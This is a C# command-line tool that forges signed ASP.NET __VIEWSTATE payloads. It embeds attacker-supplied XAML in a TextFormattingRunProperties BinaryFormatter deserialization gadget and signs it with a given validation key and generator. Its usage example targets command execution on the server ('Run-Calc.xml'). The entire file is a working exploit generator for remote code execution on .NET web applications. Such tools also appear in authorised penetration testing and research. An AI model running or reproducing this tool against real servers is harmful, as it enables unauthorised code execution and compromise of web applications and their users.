using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.Serialization;
using System.Globalization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Reflection;

namespace XamlToViewState
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context) { }
        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Assembly assembly = Assembly.LoadFrom("Microsoft.PowerShell.Editor.dll");
            info.SetType(assembly.GetType("Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"));
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }

    public class Program
    { 
        public static void ShowUsage()
        {
            string Usage = @"
Use to create viewstate from XAML file
Usage:
    <xaml path> <generator> <key>

eg.      
    XamlToViewState.exe Run-Calc.xml 042A94E8 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF
";
            Console.WriteLine(Usage);
        }        

        static byte[] strToToHexByte(string hexString) 
        {             
            if ((hexString.Length % 2) != 0) 
                hexString += " "; 
            byte[] returnBytes = new byte[hexString.Length / 2]; 
            for (int i = 0; i < returnBytes.Length; i++) 
                returnBytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16); 
            return returnBytes; 
        }
        static string CreateViewState(byte[] dat,string generator,string key)
        {
            MemoryStream ms = new MemoryStream();
            ms.WriteByte(0xff);
            ms.WriteByte(0x01);
            ms.WriteByte(0x32);
            uint num = (uint)dat.Length;
            while (num >= 0x80)
            {
                ms.WriteByte((byte)(num | 0x80));
                num = num >> 0x7;
            }
            ms.WriteByte((byte)num);
            ms.Write(dat, 0, dat.Length);
            byte[] data = ms.ToArray();

            byte[] validationKey= strToToHexByte(key);

            uint _clientstateid = 0;
            if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
            {
                System.Environment.Exit(0);
            }
 
            byte[] _mackey = new byte[4];
            _mackey[0] = (byte)_clientstateid;
            _mackey[1] = (byte)(_clientstateid >> 8);
            _mackey[2] = (byte)(_clientstateid >> 16);
            _mackey[3] = (byte)(_clientstateid >> 24);

            ms = new MemoryStream();
            ms.Write(data,0,data.Length);
            ms.Write(_mackey,0,_mackey.Length);
            byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
            ms=new MemoryStream();
            ms.Write(data,0,data.Length);
            ms.Write(hash,0,hash.Length);
            return Convert.ToBase64String(ms.ToArray());
        }
        static byte[] Serialize(object obj)
        {
            using (MemoryStream mem = new MemoryStream())
            {
                BinaryFormatter bf = new BinaryFormatter();
                bf.Serialize(mem, obj);
                return mem.ToArray();
            }
        }
        public static void Run(String xaml, String generator, String key)
        {
                string data = CreateViewState(Serialize(new TextFormattingRunPropertiesMarshal(File.ReadAllText(xaml))),generator,key);
                Console.WriteLine("__VIEWSTATE=");
                Console.WriteLine(data);
        }

        static void Main(string[] args)
        {
            if(args.Length!=3)
            {
                ShowUsage();
                System.Environment.Exit(0);
            }            
            try
            {            
                Run(args[0], args[1], args[2]);
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
            }
        }
    }
}
